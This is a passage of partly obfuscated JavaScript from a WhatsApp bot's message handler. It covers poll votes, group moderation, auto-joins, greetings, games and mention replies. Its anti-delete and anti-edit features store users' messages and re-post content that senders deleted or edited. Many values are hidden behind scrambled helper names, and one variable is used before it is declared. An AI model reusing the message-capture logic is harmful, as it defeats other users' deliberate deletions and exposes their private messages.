            msgCtx.participant = sender;
          } else {
            const dt = groupMetadata || (await getGroupMetadata());
            const du = dt?.participants.find(
              (lid) => lid.id === sender || lid.phoneNumber === sender || lid.lid === sender,
            );
            msgCtx.participant = du?.phoneNumber || du?.id || sender;
          }
        } else {
          msgCtx.participant = sender;
        }
        msgCtx.key = key;
        msgCtx.mentions = [];
        msgCtx.pushName = (pushName && pushName.replace(/\n/g, "")) || "";
        msgCtx.fromMe =
          msgCtx.participant &&
          (msgCtx.participant == sock.user.jid || msgCtx.participant == botLid);
        if (isDebugRestart) {
          index.logger.info(
            "[Handler] Step 3: participant=" +
              msgCtx.participant?.slice(0, 20) +
              ", fromMe=" +
              msgCtx.fromMe +
              ", type=" +
              msgCtx.type,
          );
        }
        if (helpers.NpYyk === msgCtx.type) {
          if (
            msgCtx.isGroup &&
            msgCtx.message.reactionMessage.key.fromMe &&
            msgCtx.message.reactionMessage.text
          ) {
            {
              const participateInVote = await index.participateInVote(
                key.remoteJid,
                msgCtx.message.reactionMessage.text,
                msgCtx.participant,
                helpers.Csvde,
                msgCtx.session,
              );
              if (participateInVote) {
                {
                  const dy =
                    "@" +
                    index.jidToNum(msgCtx.participant) +
                    " voted for " +
                    msgCtx.message.reactionMessage.text +
                    "\n\n" +
                    participateInVote;
                  const payload = {
                    contextInfo: {
                      mentionedJid: [msgCtx.participant],
                    },
                  };
                  const payload2 = {
                    text: dy,
                  };
                  const payload3 = {
                    type: helpers.fFTpI,
                    chat: key.remoteJid,
                    message: payload2,
                    options: payload,
                  };
                  client.queue.push(payload3);
                  return;
                }
              }
            }
          }
          const payload = {
            user: sock.user,
          };
          msgCtx.text = msgCtx.message.reactionMessage.text || "";
          refreshGlobalSockId();
          index.levanter.emit(helpers.LmbwO, new Message(payload, msgCtx, false, sock));
          return;
        }
        if (helpers.TXGNZ === msgCtx.type) {
          const pollMessage = await getMessage(
            msgCtx.message.pollUpdateMessage.pollCreationMessageKey,
          );
          if (!pollMessage) {
            return;
          }
          const pollEncKey = pollMessage.messageContextInfo?.messageSecret;
          const pollCreatorJid = getKeyAuthor(
            msgCtx.message.pollUpdateMessage.pollCreationMessageKey,
            sock.user.jid,
          );
          const voterJid = getKeyAuthor(key, sock.user.jid);
          const decryptedVote = helpers.vXHGP(
            decryptPollVote,
            msgCtx.message.pollUpdateMessage.vote,
            {
              pollEncKey,
              pollCreatorJid,
              pollMsgId: msgCtx.message.pollUpdateMessage.pollCreationMessageKey.id,
              voterJid,
            },
          );
          const aggregateVotes = helpers.SpFiX(getAggregateVotesInPollMessage, {
            message: pollMessage,
            pollUpdates: [
              {
                vote: decryptedVote,
                pollUpdateMessageKey: key,
              },
            ],
          });
          msgCtx.votes = aggregateVotes;
        }
        let isNotWhiteListed = !libConfig[msgCtx.session].WHITE_LIST_MAP.includes(
          msgCtx.participant,
        );
        let isSudo =
          isFromMe ||
          (msgCtx.participant &&
            libConfig[msgCtx.session].TEMP_SUDO.includes(index.jidToNum(msgCtx.participant))) ||
          (msgCtx.participant &&
            msgCtx.participant.endsWith(helpers.kxZjh) &&
            (await getGroupMetadata()) &&
            helpers.HPqqG(
              checkSudoWithCache,
              msgCtx.participant,
              await getGroupMetadata(),
              libConfig[msgCtx.session].TEMP_SUDO,
            ));
        if (isDebugRestart) {
          index.logger.info(
            "[Handler] Step 4: isSudo=" + isSudo + ", is_not_white=" + isNotWhiteListed,
          );
        }
        if (isNotWhiteListed && helpers.YzrXC === msgCtx.type && !msgCtx.fromMe) {
          {
            const groupMention = await index.getGroupMention();
            if (!groupMention.enabled) {
              return;
            }
            if (index.parsedJid(groupMention.filter).includes(key.remoteJid)) {
              return;
            }
            if (!groupMetadata) {
              return;
            }
            if (!(await index.isAdmin(groupMetadata.participants, sock.user.jid))) {
              return;
            }
            if (await index.isAdmin(groupMetadata.participants, msgCtx.participant)) {
              return;
            }
            const payload = {
              type: helpers.fFTpI,
              chat: key.remoteJid,
              message: {},
            };
            payload.message.delete = key;
            client.queue.push(payload);
            await delay(500);
            if (helpers.htnmg === groupMention.action) {
              return client.queue.push({
                type: helpers.rzwlq,
                chat: key.remoteJid,
                participant: msgCtx.participant,
              });
            }
            if (helpers.yvIEV === groupMention.action) {
              isSudo = true;
              msgCtx.text = helpers.hMXIY(
                helpers.afnzu(libConfig[msgCtx.session].PREFIX, groupMention.action),
                msgCtx.participant,
              );
              msgCtx.mentions = [msgCtx.participant];
            }
          }
        }
        if (isNotWhiteListed && helpers.GLKPg === msgCtx.type && !msgCtx.fromMe) {
          const antiGstatus = await index.getAntiGstatus();
          if (!antiGstatus.enabled) {
            return;
          }
          if (antiGstatus.jids.includes(key.remoteJid)) {
            return;
          }
          const dN = groupMetadata || (await getGroupMetadata());
          if (!dN) {
            return;
          }
          if (!(await index.isAdmin(dN.participants, sock.user.jid))) {
            return;
          }
          if (await index.isAdmin(dN.participants, msgCtx.participant)) {
            return;
          }
          const payload = {
            type: helpers.fFTpI,
            chat: key.remoteJid,
            message: {},
          };
          payload.message.delete = key;
          client.queue.push(payload);
          return;
        }
        msgCtx.edited = false;
        if (isDebugRestart) {
          index.logger.info(helpers.yhvCu);
        }
        const sessionConfig = helpers.LVEXx(
          buildSessionConfig,
          libConfig[msgCtx.session].env,
          libConfig[msgCtx.session].commands,
          libConfig[msgCtx.session].PREFIX,
          libConfig[msgCtx.session].AFK,
          libConfig[msgCtx.session].pluginsCount.count,
        );
        if (helpers.NRnQp == msgCtx.type) {
          const dP = msgCtx.message[msgCtx.type];
          if (0 !== dP.type && 14 !== dP.type) {
            return;
          }
          if (0 === dP.type) {
            const dQ = msgCtx.message[msgCtx.type];
            constant.chats.del("" + dQ.key.remoteJid + dQ.key.id);
            const {
              enabled: dR,
              destination: dS,
              scope: dT,
            } = helpers.oGopz(parseAntiDeleteSetting, libConfig[msgCtx.session].env.ANTI_DELETE);
            if (!IGNORED_GROUPS.includes(key.remoteJid) && dR && matchesScope(dT, key.remoteJid)) {
              const dU = dQ.key && (await index.getTMessage(dQ.key.id));
              if (!dU || true === dU.key.fromMe) {
                return;
              }
              await index.setTMessage(dQ.key.id, null, true);
              const flagValue = resolveDestination(dS, key.remoteJid, bot);
              const payload = {
                head: index.lang.extra.deleted_message,
                body: "",
              };
              const payload2 = {
                type: helpers.CreRu,
                chat: flagValue,
                message: dU,
                options: {},
              };
              payload2.options.quoted = dU;
              payload2.options.linkPreview = payload;
              await client.queue.push(payload2);
            }
            flag = true;
            return;
          }
          if (14 === dP.type) {
            const editedMessage = dP.editedMessage;
            const editedType = getContentType(editedMessage);
            const newText = firstNonEmpty(editedMessage, editedType) || "";
            const storedMessage = await index.getTMessage(dP.key.id);
            if (!storedMessage) {
              return;
            }
            const messageSecret =
              storedMessage.message?.messageContextInfo?.messageSecret ||
              msgCtx.message?.messageContextInfo?.messageSecret;
            const updatedMessage = {
              key: storedMessage.key,
              message: messageSecret
                ? {
                    ...editedMessage,
                    messageContextInfo: {
                      ...(editedMessage.messageContextInfo || {}),
                      messageSecret,
                    },
                  }
                : editedMessage,
            };
            const editResult = await index.updateTMessage(dP.key.id, updatedMessage);
            const {
              enabled,
              destination: destinationSetting,
              scope: scopeSetting,
            } = helpers.IwyLz(parseAntiDeleteSetting, libConfig[msgCtx.session].env.ANTI_EDIT);
            if (editResult && enabled && matchesScope(scopeSetting, key.remoteJid)) {
              {
                const latestEntry = editResult.history[editResult.history.length - 1];
                const latestMessage = (latestEntry && latestEntry.message) || latestEntry;
                if (
                  helpers.DrpAM(
                    helpers.YKblH(firstNonEmpty, latestMessage, getContentType(latestMessage)) ||
                      "",
                    newText,
                  )
                ) {
                  const targetChat = resolveDestination(destinationSetting, key.remoteJid, bot);
                  let reportText = "";
                  for (
                    let historyIndex = editResult.history.length - 1;
                    historyIndex >= 0;
                    historyIndex--
                  ) {
                    const historyEntry = editResult.history[historyIndex];
                    const historyMessage = historyEntry.message || historyEntry;
                    reportText +=
                      "*#" +
                      (historyIndex + 1) +
                      "*\n" +
                      (helpers.vXHGP(
                        firstNonEmpty,
                        historyMessage,
                        getContentType(historyMessage),
                      ) || "") +
                      "\n\n";
                  }
                  reportText = reportText.trim();
                  const firstEntry = editResult.history[0];
                  const reportBody = {
                    text: reportText,
                  };
                  await client.queue.push({
                    type: helpers.fFTpI,
                    chat: targetChat,
                    message: reportBody,
                    options: {
                      quoted: firstEntry,
                      linkPreview: {
                        head: (index.lang.extra.edited_message || helpers.OlZnn).replace(
                          helpers.ByXPI,
                          editResult.editCount,
                        ),
                        body: "",
                      },
                    },
                  });
                }
              }
            }
            msgCtx.message = dP.editedMessage;
            msgCtx.type = getContentType(msgCtx.message);
            msgCtx.edited = true;
          }
        }
        let messageText = firstNonEmpty(msgCtx.message, msgCtx.type);
        if (helpers.mTMRl(helpers.vMJOC, libConfig[msgCtx.session].env.AJOIN)) {
          {
            if (helpers.aguqN == msgCtx.type) {
              await delay(1000);
              const ek = {
                id: msgCtx.key.remoteJid,
                key: msgCtx.key,
                message: msgCtx.message[msgCtx.type],
              };
              const el = ek;
              const floor = Math.floor(helpers.miXTe(helpers.aEPdc(9000, Math.random()), 1000));
              const payload = {
                key,
                message,
              };
              const payload2 = {
                quoted: payload,
              };
              pendingGroupInvites[floor] = el;
              return await client.queue.push({
                type: helpers.fFTpI,
                chat: bot,
                message: {
                  text: "Send " + floor + ", to join",
                },
                options: payload2,
              });
            }
            if (
              pendingGroupInvites[messageText] &&
              pendingGroupInvites[messageText].id == msgCtx.key.remoteJid
            ) {
              await delay(1000);
              try {
                const payload = {
                  key,
                  message,
                };
                const payload2 = {
                  quoted: payload,
                };
                await sock.groupAcceptInviteV4(
                  pendingGroupInvites[messageText].key,
                  pendingGroupInvites[messageText].message,
                );
                await delay(1000);
                await client.queue.push({
                  type: helpers.fFTpI,
                  chat: bot,
                  message: {
                    text: helpers.FaHnH,
                  },
                  options: payload2,
                });
              } catch (error) {
                {
                  index.logger.error(error, helpers.EIptc);
                }
              } finally {
                delete pendingGroupInvites[messageText];
              }
              return;
            }
          }
        }
        msgCtx.admin = false;
        msgCtx.botIsAdmin = false;
        if (msgCtx.isGroup) {
          {
            const eu = groupMetadata || (await getGroupMetadata());
            if (eu) {
              try {
                msgCtx.admin = await index.isAdmin(eu.participants, msgCtx.participant);
                msgCtx.botIsAdmin = await index.isAdmin(eu.participants, sock.user.jid);
              } catch (ev) {}
            }
          }
        }
        msgCtx.SUDO = isSudo;
        msgCtx.isForwarded = msgCtx.message[msgCtx.type]?.contextInfo?.isForwarded;
        const messageExpiration = msgCtx.message[msgCtx.type]?.contextInfo?.expiration;
        if (
          !msgCtx.isGroup &&
          !msgCtx.fromMe &&
          helpers.qbHmW(helpers.IDzJM, libConfig[msgCtx.session].env.PERSONAL_MESSAGE) &&
          ((greetedMembers[msgCtx.session] ||= new Set()),
          !greetedMembers[msgCtx.session].has(msgCtx.participant))
        ) {
          {
            if (!(await getPmMessage(msgCtx.participant, msgCtx.session))) {
              {
                {
                  {
                    const SHVIW = helpers.SHVIW(
                      isUrl,
                      libConfig[msgCtx.session].env.PERSONAL_MESSAGE,
                    );
                    if (SHVIW && SHVIW.startsWith(helpers.YeyMa)) {
                      {
                        const buffer = await index.getBuffer(SHVIW, false);
                        if (
                          buffer.buffer &&
                          [helpers.CLMpj, helpers.ISZaj, helpers.AziPl].includes(buffer.type)
                        ) {
                          mentionState.path = path.join(
                            __dirname,
                            "../media/greet." + buffer.mimetype.split("/")[1].split(".").pop(),
                          );
                          fsExtra.writeFileSync(mentionState.path, buffer.buffer);
                          mentionState.type = buffer.mimetype.endsWith(helpers.UlAXh)
                            ? helpers.ddzHo
                            : buffer.type;
                          mentionState.message = libConfig[
                            msgCtx.session
                          ].env.PERSONAL_MESSAGE.replace(SHVIW, "").trim();
                        }
                      }
                    }
                    mentionState.done = true;
                    mentionState.message ||= libConfig[msgCtx.session].env.PERSONAL_MESSAGE;
                  }
                }
                const ey = mentionState.type ? mentionState.type : helpers.ZOZIJ;
                const uptimeQuoteReplace = await index.uptimeQuoteReplace(mentionState.message);
                try {
                  {
                    await client.queue.push({
                      type: helpers.fFTpI,
                      chat: msgCtx.participant,
                      message: {
                        [ey]:
                          helpers.ZOZIJ == ey
                            ? uptimeQuoteReplace
                            : fsExtra.readFileSync(mentionState.path),
                      },
                      options: {
                        caption: uptimeQuoteReplace,
                      },
                    });
                    await setPmMessage(msgCtx.participant, msgCtx.session);
                  }
                } catch (error) {
                  index.logger.error(error);
                }
              }
            }
            greetedMembers[msgCtx.session].add(msgCtx.participant);
          }
        }
        const platform = guessPlatformFromId(key.id);
        const isWebPlatform = helpers.QlmJK === platform;
        const mentionedJids = msgCtx.message[msgCtx.type]?.contextInfo?.mentionedJid || [];
        msgCtx.mentions = [];
        if (isDebugRestart && mentionedJids.length > 0) {
          index.logger.info(
            "[Handler] Resolving " +
              mentionedJids.length +
              " mentions for msg " +
              key.id?.slice(-8),
          );
        }
        for (const mentionedJid of mentionedJids) {
          let eH = jidNormalizedUser(mentionedJid) || mentionedJid;
          if (eH.endsWith(helpers.kxZjh)) {
            if (isDebugRestart) {
              index.logger.info("[Handler] Resolving LID mention: " + eH?.slice(0, 15) + "...");
            }
            eH = (await libConfig[msgCtx.session].findJid(eH)) || eH;
            if (isDebugRestart) {
              index.logger.info("[Handler] Resolved to: " + eH?.slice(0, 15) + "...");
            }
          }
          msgCtx.mentions.push(jidNormalizedUser(eH));
        }
        msgCtx.isBot =
          helpers.VBpnu(helpers.wOsuk, typeof key.id) &&
          ((key.id.startsWith(helpers.Kzerm) && 12 === key.id.length) ||
            (key.id.startsWith(helpers.GrpPV) && 16 === key.id.length));
        msgCtx.isBot ||= helpers.EJIrI == platform;
        if (!msgCtx.isBot && !(null == messageExpiration)) {
          expiration.set(key.remoteJid, messageExpiration);
        }
        if (
          isNotWhiteListed &&
          (msgCtx.isBot ||
            (isWebPlatform &&
              helpers.STTuw(helpers.vMJOC, libConfig[msgCtx.session].env.IGNORE_WEB))) &&
          !msgCtx.fromMe &&
          helpers.vDEio(helpers.fqNJp, libConfig[msgCtx.session].env.ANTI_BOT) &&
          msgCtx.isGroup &&
          !msgCtx.admin
        ) {
          {
            if (msgCtx.SUDO) {
              return;
            }
            const eJ = groupMetadata || (await getGroupMetadata());
            if (!eJ) {
              return;
            }
            const participants = eJ.participants;
            if (!participants) {
              return;
            }
            if (!(await index.isAdmin(participants, sock.user.jid))) {
              return;
            }
            if (await index.isAdmin(participants, msgCtx.participant)) {
              return;
            }
            if (!helpers.rpxfH(helpers.vMJOC, libConfig[msgCtx.session].env.ANTI_BOT)) {
              {
                if (
                  !index
                    .parsedJid(libConfig[msgCtx.session].env.ANTI_BOT)
                    .includes(msgCtx.key.remoteJid)
                ) {
                  return;
                }
              }
            }
            const payload = {
              type: helpers.rzwlq,
              chat: key.remoteJid,
              participant: msgCtx.participant,
            };
            await client.queue.push(payload);
            await delay(1000);
            if (helpers.cOvuz(helpers.fqNJp, libConfig[msgCtx.session].env.ANTI_BOT_MESSAGE)) {
              await client.queue.push({
                type: helpers.fFTpI,
                chat: key.remoteJid,
                message: {
                  text: libConfig[msgCtx.session].env.ANTI_BOT_MESSAGE.replace(
                    helpers.buqDk,
                    "@" + index.jidToNum(msgCtx.participant),
                  ),
                },
                options: {
                  contextInfo: {
                    mentionedJid: [msgCtx.participant],
                  },
                },
              });
            }
            return;
          }
        }
        if (helpers.LPykf == msgCtx.type) {
          const eN = msgCtx.message[msgCtx.type]?.fileSha256?.toString(helpers.XpRLI);
          if (
            (msgCtx.SUDO || msgCtx.fromMe) &&
            eN &&
            libConfig[msgCtx.session].db?.cmd &&
            libConfig[msgCtx.session].db.cmd[eN]
          ) {
            messageText = helpers.YRJDA(
              libConfig[msgCtx.session].PREFIX,
              libConfig[msgCtx.session].db.cmd[eN],
            );
          }
        }
        if (
          !!helpers.tGfMK(
            shouldSendReadReceipt,
            libConfig[msgCtx.session].env.SEND_READ,
            key.remoteJid,
          ) &&
          !msgCtx.isBot &&
          !isFromMe &&
          !msgCtx.votes
        ) {
          if (helpers.dRdbu === msgCtx.type && msgCtx.message[msgCtx.type].ptt) {
            await sock.sendReceipt(key.remoteJid, key.participant, [key.id], helpers.Heavd);
          } else {
            await client.queue.push({
              type: helpers.CueTI,
              chat: key.remoteJid,
              participant: key.participant,
              ids: [key.id],
            });
          }
        }
        msgCtx.text = messageText || "";
        if (!msgCtx.isBot && msgCtx.text) {
          {
            if (
              await index.wcg.isWord(
                key.remoteJid,
                msgCtx.participant,
                msgCtx.text,
                {
                  key,
                  message,
                },
                msgCtx.session,
              )
            ) {
              return;
            }
            if (msgCtx.text.toLowerCase().endsWith(helpers.fnNoM)) {
              {
                if (await index.wcg.join(key.remoteJid, msgCtx.participant, msgCtx.session)) {
                  return;
                }
              }
            }
          }
        }
        msgCtx.messageTimestamp = messageTimestamp;
        msgCtx.quoted = null;
        const contextInfo = msgCtx.message[msgCtx.type]?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;
        if (quotedMessage) {
          {
            let eR = {};
            eR.message = normalizeMessageContent(quotedMessage);
            const eS = contextInfo.participant || contextInfo.participantAlt;
            const eT = eS.endsWith(helpers.toEOt)
              ? await libConfig[msgCtx.session].findJid(eS)
              : eS;
            eR.key = {
              remoteJid: contextInfo.remoteJid || key.remoteJid,
              fromMe: contextInfo.participant == sock.user.jid,
              id: contextInfo.stanzaId,
              participant: eS,
              participantAlt: jidNormalizedUser(eT),
            };
            eR.type = getContentType(quotedMessage) || Object.keys(quotedMessage)[0];
            if (
              [helpers.hoGGI, helpers.VKPCc, helpers.osVFg, helpers.QLLlw, helpers.IVZqg].includes(
                eR.type,
              )
            ) {
              eR.message = helpers.pVSyC(normalizeMessageContent, quotedMessage[eR.type].message);
              eR.type = getContentType(eR.message);
            }
            eR.isGroup = isJidGroup(eR.key.remoteJid);
            jidNormalizedUser(eR.key.participantAlt);
            eR.participant = eR.isGroup
              ? await libConfig[msgCtx.session].findJid(eR.key.participant)
              : await libConfig[msgCtx.session].findJid(eR.key.remoteJid);
            eR.fromMe = eR.key.fromMe;
            eR.isBot =
              (helpers.Owmab(helpers.wOsuk, typeof eR.key.id) &&
                eR.key.id.startsWith(helpers.Kzerm) &&
                12 == eR.key.id.length) ||
              (helpers.qceAE(helpers.wOsuk, typeof eR.key.id) &&
                eR.key.id.startsWith(helpers.GrpPV) &&
                16 === eR.key.id.length);
            const eU = eR.message[eR.type];
            eR.text = helpers.gnwyw(helpers.wOsuk, typeof eU) ? eU : null;
            eR.text ||=
              eU?.text ||
              eU?.caption ||
              eU?.conversation ||
              eU?.contentText ||
              eU?.selectedDisplayText ||
              eU?.title ||
              "";
            msgCtx.quoted = eR;
            eR = null;
          }
        }
        if (
          config.API_ENABLED &&
          helpers.ozaOA !== msgCtx.type &&
          !String(msgCtx.key.remoteJid).includes(helpers.hrzBx)
        ) {
          index.levanter.emit(helpers.WKUnd, msgCtx);
        }
        if (!config.BOT_ENABLED) {
          return;
        }
        const messageCategory =
          helpers.jIaEL == msgCtx.type || helpers.PBpoj == msgCtx.type
            ? helpers.ZOZIJ
            : msgCtx.type.split(msgCtx.type.match(/[A-Z]/) || [])[0];
        if (messageCategory && msgCtx.isGroup && !msgCtx.isBot && "0" === msgCtx.session) {
          {
            if (!msgCtx.key.remoteJid || !msgCtx.participant) {
              index.logger.warn({
                message: msg,
                error: "missing gid/uid for " + msgCtx.type + ". Msg ID: " + msgCtx.key.id,
              });
              return;
            }
            await setMsgs(
              msgCtx.key.remoteJid,
              msgCtx.participant,
              messageCategory,
              msgCtx.pushName,
            );
          }
        }
        if (helpers.STTuw(helpers.vMJOC, libConfig[msgCtx.session].env.LOG_MSG)) {
          index.logger.debug({
            id: msgCtx.key.id,
            remoteJid: key.remoteJid,
            text: msgCtx.text ? msgCtx.text : msgCtx.type,
            participant: msgCtx.isGroup ? index.jidToNum(msgCtx.participant) : "",
          });
        }
        if (helpers.ZOZIJ == messageCategory && !msgCtx.isBot && !msgCtx.votes) {
          const parsedNumber = Number(msgCtx.text);
          if (parsedNumber >= 1 && parsedNumber < 10) {
            {
              const { code: statusCode, text: replyTexts } = await tictactoe.isTicTacToe(
                msgCtx.text,
                msgCtx.key.remoteJid,
                msgCtx.participant,
                msgCtx.session,
              );
              const firstBody = {
                text: replyTexts,
              };
              const firstOptions = {
                quoted: msg,
              };
              if (process.env.LEVANTER_TEST && statusCode) {
                console.log(helpers.iWFWD, statusCode);
              }
              if (300 == statusCode) {
                return await client.queue.push({
                  type: helpers.fFTpI,
                  chat: msgCtx.key.remoteJid,
                  message: firstBody,
                  options: firstOptions,
                });
              }
              const secondBody = {
                text: replyTexts[2],
              };
              const mentionOptions = {
                mentionedJid: [replyTexts[0], replyTexts[1]],
              };
              const contextOptions = {
                contextInfo: mentionOptions,
              };
              if (301 == statusCode) {
                return await client.queue.push({
                  type: helpers.fFTpI,
                  chat: msgCtx.key.remoteJid,
                  message: secondBody,
                  options: contextOptions,
                });
              }
              if (201 == statusCode) {
                const f4 =
                  "---" +
                  index.lang.plugins.tictactoe.game_finish +
                  "---\n\n" +
                  index.lang.plugins.tictactoe.winner +
                  " : @" +
                  index.jidToNum(replyTexts[0]) +
                  "\n\n" +
                  replyTexts[2];
                const payload = {
                  text: f4,
                };
                const payload2 = {
                  mentionedJid: [replyTexts[0], replyTexts[1]],
                };
                const payload3 = {
                  contextInfo: payload2,
                };
                const payload4 = {
                  type: helpers.fFTpI,
                  chat: msgCtx.key.remoteJid,
                  message: payload,
                  options: payload3,
                };
                return await client.queue.push(payload4);
              }
              if (403 == statusCode) {
                const f9 = "---Game Tie ⏹---\n\n" + replyTexts[2];
                const payload = {
                  text: f9,
                };
                const payload2 = {
                  mentionedJid: [replyTexts[0], replyTexts[1]],
                };
                const payload3 = {
                  contextInfo: payload2,
                };
                const payload4 = {
                  type: helpers.fFTpI,
                  chat: msgCtx.key.remoteJid,
                  message: payload,
                  options: payload3,
                };
                return await client.queue.push(payload4);
              }
            }
          }
        }
        if (
          libConfig[msgCtx.session].AFK &&
          libConfig[msgCtx.session].AFK.isAfk &&
          !msgCtx.isBot &&
          msgCtx.text
        ) {
          const fg =
            !msgCtx.isGroup ||
            msgCtx.mentions.includes(libConfig[msgCtx.session].AFK.p) ||
            (msgCtx.quoted &&
              helpers.kRHSr(msgCtx.quoted.participant, libConfig[msgCtx.session].AFK.p));
          const payload = {
            text: index.lang.plugins.afk.not_afk,
          };
          const payload2 = {
            key,
            message,
          };
          const payload3 = {
            quoted: payload2,
          };
          if (msgCtx.fromMe || helpers.rpxfH(msgCtx.participant, libConfig[msgCtx.session].AFK.p)) {
            libConfig[msgCtx.session].AFK.isAfk = false;
            return await client.queue.push({
              type: helpers.fFTpI,
              chat: libConfig[msgCtx.session].AFK.p,
              message: payload,
              options: payload3,
            });
          }
          if (fg) {
            return await client.queue.push({
              type: helpers.fFTpI,
              chat: key.remoteJid,
              message: {
                text: libConfig[msgCtx.session].AFK.reason.replace(
                  helpers.RzNkY,
                  helpers.UuNKd(
                    secondsToHms,
                    helpers.fXblg(
                      Math.round(helpers.zAvPT(new Date().getTime(), 1000)),
                      libConfig[msgCtx.session].AFK.lastseen,
                    ),
                  ),
                ),
              },
              options: {
                quoted: {
                  key,
                  message,
                },
              },
            });
          }
        }
        let flag = false;
        const logout = sock.logout;
        let sudoJid =
          msgCtx.participant && msgCtx.participant.endsWith(helpers.kxZjh)
            ? helpers.RRpNJ(toLid, libConfig[msgCtx.session].TEMP_SUDO[0])
            : index.numToJid(libConfig[msgCtx.session].TEMP_SUDO[0]);
        const selfJids = [sock.user.jid];
        if (sock.user.lid) {
          selfJids.push(sock.user.lid);
          selfJids.push(lid(sock.user.lid));
        }
        if (sudoJid) {
          selfJids.push(sudoJid);
        }
        const isBotMentioned =
          helpers.ozaOA !== msgCtx.type &&
          msgCtx.mentions.some(
            (fk) => selfJids.includes(fk) || selfJids.includes(jidNormalizedUser(fk)),
          );
        if (!msgCtx.edited && !msgCtx.isBot && isBotMentioned) {
          const mention = await index.getMention(msgCtx.session);
          if (mention && mention.enabled && !IGNORED_GROUPS.includes(key.remoteJid)) {
            const fl = {};
            const payload = {
              key,
              message,
            };
            fl.quoted = payload;
            fl.contextInfo = {};
            const fn = libConfig[msgCtx.session].parsedMention;
            if (fn) {
              {
                const fs = structuredClone(fn);
                await processSecurityChecks(fs);
                Object.assign(fl, fs);
              }
            }
            const urls = extractUrls(mention.text);
            const mediaKind = mediaKindFromMime(mention.text);
            let caption = mention.text;
            if ([helpers.yxJqz, helpers.CLMpj, helpers.oBATK].includes(mediaKind) && urls) {
              for (const item of urls) {
                caption = caption.replace(item, "").trim();
              }
              fl.caption = caption.replace(helpers.xIfXn + mediaKind, "").trim();
            }
            if (urls && mediaKind) {
              const fu = MEDIA_MIME[mediaKind];
              const fv = MEDIA_EXTENSION[mediaKind];
              const mediaUrl = pickRotating(urls);
              fl.mimetype = fu;
              if (helpers.oBATK === mediaKind) {
                fl.gifPlayback = true;
              }
              if (helpers.AziPl === mediaKind) {
                fl.ptt = true;
              }
              let fx =
                "" +
                (index.nameFromUrl(mediaUrl) || helpers.Rsium) +
                (helpers.ddzHo === mediaKind || helpers.AziPl === mediaKind ? fv : "");
              if (
                !fsExtra.existsSync(
                  helpers.vrUyM(join, __dirname, "../media/mention/" + msgCtx.session + fx),
                )
              ) {
                const cacheError = await cacheMentionMedia(mediaUrl, fx, mediaKind, msgCtx.session);
                if (cacheError) {
                  let fz =
                    "```---ERROR REPORT---\n\nVersion : " +
                    config.VERSION +
                    "\nMessage : " +
                    cacheError +
                    "\nError   : failed to fetch " +
                    mediaUrl +
                    "\nJid     : " +
                    key.remoteJid +
                    "\ncommand : @mention\nPlatform : " +
                    index.PLATFORM +
                    "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
                  const payload = {
                    text: fz,
                  };
                  const payload2 = {
                    key,
                    message,
                  };
                  const payload3 = {
                    quoted: payload2,
                  };
                  const payload4 = {
                    type: helpers.fFTpI,
                    chat: bot,
                    message: payload,
                    options: payload3,
                  };
                  client.queue.push(payload4);
                  return;
                }
              }
              try {
                {
                  const fileSync = fsExtra.readFileSync(
                    helpers.HfaAy(join, __dirname, "../media/mention/" + msgCtx.session + fx),
                  );
                  const fF = {
                    [MEDIA_KIND[mediaKind]]: fileSync,
                    ...fl,
                  };
                  const payload = {
                    type: helpers.fFTpI,
                    chat: key.remoteJid,
                    message: fF,
                    options: fl,
                  };
                  client.queue.push(payload);
                }
              } catch (error) {
                {
                  let fJ =
                    "```---ERROR REPORT---\n\nVersion : " +
                    config.VERSION +
                    "\nMessage : " +
                    error +
                    "\nError   : failed to fetch " +
                    mediaUrl +
                    "\nJid     : " +
                    key.remoteJid +
                    "\ncommand : @mention\nPlatform : " +
                    index.PLATFORM +
                    "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
                  const payload = {
                    text: fJ,
                  };
                  const payload2 = {
                    key,
                    message,
                  };
                  const payload3 = {
                    quoted: payload2,
                  };
                  const payload4 = {
                    type: helpers.fFTpI,
                    chat: bot,
                    message: payload,
                    options: payload3,
                  };
                  client.queue.push(payload4);
                  return;
                }
              }
            } else {
              client.queue.push({
                type: helpers.fFTpI,
                chat: key.remoteJid,
                message: {
                  text: mention.text,
                  ...fl,
                },
                options: fl,
              });
            }
          }
        }
        const hasUrls = !!msgCtx.text && /https?:\/\/|www\./i.test(msgCtx.text);
        if (msgCtx.isGroup && helpers.ozaOA !== msgCtx.type) {
          runSecurityChecks(
            msgCtx,
            key,
            message,
            client,
            sock,
            groupMetadata,
            hasUrls,
            isNotWhiteListed,
            testSpamFlag,
          ).catch((message) => {
            console.error(helpers.KKAzf, message.message);
            index.logger.error(message, helpers.CkOgC);
          });
        }
        if (
          !flag &&
          !(helpers.ozaOA === msgCtx.type) &&
          !IGNORED_GROUPS.includes(key.remoteJid) &&
          (!helpers.EHWYw(helpers.IDzJM, libConfig[msgCtx.session].env.ANTI_DELETE) ||
            !helpers.QMMGi(helpers.IDzJM, libConfig[msgCtx.session].env.ANTI_EDIT))
        ) {
          index.setTMessage(msgCtx.key.id, {
            key: msgCtx.key,
            message: msgCtx.message,
          });
        }
        const allowedCommands = await index.yami(
          msgCtx.key.remoteJid,
          msgCtx.session,
          true,
          msgCtx.participant,
        );
        refreshGlobalSockId();
        if (KICK_WARN_DLT_RE.test(msgCtx.text) && msgCtx.isBot && msgCtx.isGroup && msgCtx.fromMe) {
          flag2 = !flag2;
          msgCtx.text = helpers.afnzu(libConfig[msgCtx.session].PREFIX, msgCtx.text);
        }
        if (process.env.LEVANTER_TEST && helpers.ozaOA === msgCtx.type) {
          process.stdout.write(
            "[TEST] Event reaching mid-point. Action: " + msgCtx.event_action + "\n",
          );
        }
        const handlerSock = sock;
        handlerSock.owner = bot;
        handlerSock.queue = client.queue;
        const commandCacheKey = "" + msgCtx.text + msgCtx.session;
        if (
          !msgCtx.isBot &&
          !msgCtx.votes &&
          (msgCtx.fromMe || isSudo || allowedCommands) &&
          index.cached[commandCacheKey] &&
          index.cached[commandCacheKey].gid == key.remoteJid &&
          (index.cached[commandCacheKey].uid == msgCtx.participant || msgCtx.fromMe || isSudo)
        ) {
          msgCtx.text = helpers.afnzu(
            libConfig[msgCtx.session].PREFIX,
            index.cached[commandCacheKey].text,
          );
          delete index.cached[commandCacheKey];
        } else if (msgCtx.votes && !msgCtx.isBot && (msgCtx.fromMe || isSudo || allowedCommands)) {
          {
            const find = msgCtx.votes.find(
              (voters) =>
                voters.voters.includes(msgCtx.participant) || voters.voters.includes("me"),
            );
            if (
              find &&
              index.cached[find.name] &&
